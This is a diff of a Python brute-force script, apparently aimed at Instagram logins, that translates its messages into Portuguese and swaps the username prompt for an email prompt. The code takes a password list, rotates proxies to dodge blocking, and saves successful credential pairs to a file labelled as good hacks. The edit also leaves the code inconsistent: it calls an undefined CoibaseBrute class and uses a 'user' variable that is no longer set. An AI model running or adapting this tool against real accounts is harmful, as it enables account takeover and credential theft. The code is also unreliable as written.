@@ -32,7 +32,7 @@ print('''
      
 Author   : Gilmarfilho
 
-depend on vpn. Please use it before running the tool or providing a proxy file           """"""""""""""""""""""""""""""""""""""""""
+depende de vpn. Use-o antes de executar a ferramenta ou fornecer um arquivo proxy        """"""""""""""""""""""""""""""""""""""""""
 ''')
 
 
@@ -40,11 +40,11 @@ class InstaBrute(object):
     def __init__(self):
 
         try:
-            user = input('username : ')
+            email = input('email: ')
             Combo = input('passList : ')
             self.CurrentProxy = ''
             self.UsedProxys = []
-            UsePorxy = input('[*] Do you want to use proxy (y/n): ').upper()
+            UsePorxy = input('[*] Você quer usar proxy(y/n): ').upper()
             if (UsePorxy == 'Y' or UsePorxy == 'YES'):
                 self.randomProxy()
 
@@ -77,11 +77,11 @@ class InstaBrute(object):
         while 1:
             try:
                 print('')
-                print('[*] Check new ip...')
+                print('[*] Verificar novo ip...')
                 response = requests.get('https://api.ipify.org/?format=raw', proxies={"http": proxy, "https": proxy},
                                         timeout=10.0).text
                 if re.match(r'((?:\d{1,3}\.){3}\d{1,3})', response) != None:
-                    print(whiteB_color + '[*] Your public ip: %s' % response)
+                    print(whiteB_color + '[*] Seu ip público: %s' % response)
                     print('')
                     break
                 else:
@@ -133,11 +133,11 @@ class InstaBrute(object):
             print (green_color + 'username: '+ user + ' | '' password: '+ pwd )
             print('----------------------------')
             if 'checkpoint_url' in r.text:
-                print(('' + user + ':' + pwd + ' --> Good hack '))
+                print(('' + user + ':' + pwd + ' --> Bom hack '))
                 with open('good.txt', 'a') as x:
                     x.write(user + ':' + pwd + '\n')
             if 'checkpoint_required' in r.text:
-                print(('' + user + ':' + pwd + ' --> Good hack '))
+                print(('' + user + ':' + pwd + ' --> Bom hack '))
                 with open('good.txt', 'a') as x:
                     x.write(user + ':' + pwd + '\n')
             elif 'two_factor_required' in r.text:
@@ -147,4 +147,4 @@ class InstaBrute(object):
 
 
 
-InstaBrute()
+CoibaseBrute()
